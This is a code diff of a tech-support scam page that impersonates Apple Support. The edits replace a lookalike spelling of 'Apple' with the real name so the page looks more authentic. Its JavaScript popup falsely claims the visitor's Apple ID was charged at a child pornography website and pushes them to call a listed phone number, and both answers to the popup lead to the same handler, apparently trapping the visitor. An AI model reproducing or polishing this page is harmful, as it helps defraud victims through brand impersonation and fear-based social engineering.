@@ -134,7 +134,7 @@
                 <div class="ac-ln-background"></div>
                 <div class="ac-ln-content">
                     <span class="ac-ln-title">
-                       <a href="#">Applẹ Support +1-877-470-4064 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+                       <a href="#">Apple Support +1-877-470-4064 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
 					 </span>
                     <div class="ac-ln-menu">
                         <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
@@ -182,7 +182,7 @@
                     </div>
                     <div class="as-banner-content">
                         <div class="pageTitle  ">
-                            <h1 class="pageTitle-heading">Applẹ Support </h1>
+                            <h1 class="pageTitle-heading">Apple Support </h1>
                             <p class="pageTitle-intro js_setTextBlock" />
                         </div>
                         <div class="sectionTitle sectionTitleBlock">
@@ -204,7 +204,7 @@
 					States </a>
                 </div>
                 <div class="ac-gf-footer-legal">
-                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Applẹ . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
                     <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
 					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
                         <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
@@ -354,7 +354,7 @@
         };
 
         function myFunction() {
-            if (confirm("Your Applẹ ID was recently used at CHÍLD P0RN0GRÀPHY WEBSITE for $549.70 Via Applẹ Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Applẹ Support +1-877-470-4064 to Freeze it!.")) {
+            if (confirm("Your Apple ID was recently used at CHÍLD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-877-470-4064 to Freeze it!.")) {
                 okkkk();
             } else {
                 okkkk();
